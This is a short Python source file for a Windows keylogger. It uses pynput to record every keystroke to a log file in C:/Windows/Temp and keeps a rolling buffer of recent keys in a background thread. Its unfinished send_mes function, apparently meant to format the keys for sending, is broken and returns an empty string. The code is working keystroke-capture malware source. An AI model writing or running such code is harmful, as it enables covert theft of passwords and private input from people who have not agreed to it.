from pynput.keyboard import Listener, _win32, Key
import logging
import time
from threading import Thread

log_dir = 'C:/Windows/Temp/'
logs = []
logging.basicConfig(filename=(log_dir+'key_log.txt'), level=logging.DEBUG, format='%(message)s')


def on_press(key):
    global logs
    if len(logs) > 100:
        logs.pop(0)
    logging.info(str(key))
    if type(key) is _win32.KeyCode:
        logs.append(key)
    else:
        logs.append(str(key))


def Log():
    with Listener(on_press=on_press) as listener:
        listener.join()


a = Thread(target=Log)
a.start()


def send_mes(logs):
    s=''
    for i in range(len(logs)):
        if i%20==0:
            s.join('\n')
        s.join(logs[i])
    return s


